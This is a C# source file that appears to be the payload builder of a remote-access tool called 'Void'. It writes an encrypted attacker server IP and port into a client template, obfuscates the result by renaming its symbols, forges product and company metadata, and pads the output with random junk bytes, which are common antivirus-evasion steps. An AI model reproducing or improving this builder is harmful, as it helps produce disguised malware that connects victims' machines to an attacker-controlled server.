using Mono.Cecil;
using Vestris.ResourceLib;
using System.Windows.Forms;
using System.Threading.Tasks;
using System;
using System.Threading;
using System.IO;
using Void_server.Controls;
using System.Linq;

namespace Void_server.Libs
{
    public static class Builder
    {
        private static Label statusLabel { get; set; }

        private static void SetStatus(string text)
        {
            statusLabel.Invoke(new Action(() => statusLabel.Text = text));
        }

        public static void Build(BuildOptions options, Label status)
        {
            statusLabel = status;

            SetStatus("Getting cryptography key");
            string randomFilename = "";
            string operand;
            string operand2;
            randomFilename = Path.GetRandomFilename(20, "");
            Cryptography.DeriveKeys(options.Password, out operand, out operand2);

            SetStatus("Writing binary");
            AssemblyDefinition assemblyDef = AssemblyDefinition.ReadAssembly("ClientTemplate.bin");
            TypeDefinition typeDef = assemblyDef.MainModule.Types.First(ty => ty.FullName == "Void_client.Settings");
            MethodDefinition methodDef = typeDef.Methods.First(me => me.Name == ".cctor");
            int index = 1;
            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
            {
                var instruction = methodDef.Body.Instructions[i];
                if (instruction.OpCode.Name == "ldstr")
                {
                    switch (index)
                    {
                        case 1:
                            instruction.Operand = AES.Encrypt(options.serverIP, randomFilename);
                            break;
                        case 2:
                            instruction.Operand = AES.Encrypt(options.port, randomFilename);
                            break;
                        case 3:
                            instruction.Operand = AES.Encrypt(GetChecked(options.additionalSettings[0]), randomFilename);
                            break;
                        case 4:
                            instruction.Operand = randomFilename;
                            break;
                    }
                    index++;

                }
            }

            Renamer renamer = null;
            renamer = new Renamer(assemblyDef);
            if (!renamer.Perform())
            {
                MessageBox.Show("failed to rename", "error");
                return;
            }
            renamer.AsmDef.Write(options.OutputPath);
            SetStatus("Setting assembly information");
            if (options.AssemblyInformation != null)
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(options.OutputPath);
                versionResource.FileVersion = options.AssemblyInformation[2];
                versionResource.ProductVersion = options.AssemblyInformation[2];
                versionResource.Language = 0;
                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = options.AssemblyInformation[3];
                stringFileInfo["FileDescription"] = options.AssemblyInformation[1];
                stringFileInfo["ProductName"] = options.AssemblyInformation[0];
                stringFileInfo["LegalCopyright"] = options.AssemblyInformation[3];
                stringFileInfo["LegalTrademarks"] = options.AssemblyInformation[3];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = options.AssemblyInformation[0];
                stringFileInfo["OriginalFilename"] = options.AssemblyInformation[0];
                stringFileInfo["Title"] = GetName(options.OutputPath);
                versionResource.SaveTo(options.OutputPath);
            }

            if (options.additionalSettings[1].Checked)
            {
                SetStatus("Adding junk");

                FileStream stream = new FileStream(options.OutputPath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
                BinaryWriter writer = new BinaryWriter(stream);

                stream.Position = stream.Length + 1;

                writer.Write(GetRandomJunk(int.Parse(options.additionalSettings[1].optionalValue)));

                writer.Close();
                stream.Close();
            }

            SetStatus("Done building!");
            
            File.Delete("ClientTemplate.bin");

            Thread.Sleep(4000);
            SetStatus("");
        }

        private static byte[] GetRandomJunk(int amount)
        {
            byte[] buffer = new byte[amount];
            Random rand = new Random();
            rand.NextBytes(buffer);
            return buffer;
        }

        private static string GetName(string path)
        {
            string[] splitted = path.Split('\\');

            return splitted[splitted.Length - 1];
        }

        private static string GetChecked(StyledCheckBox option)
        {
            return option.Checked.ToString();
        }
    }
}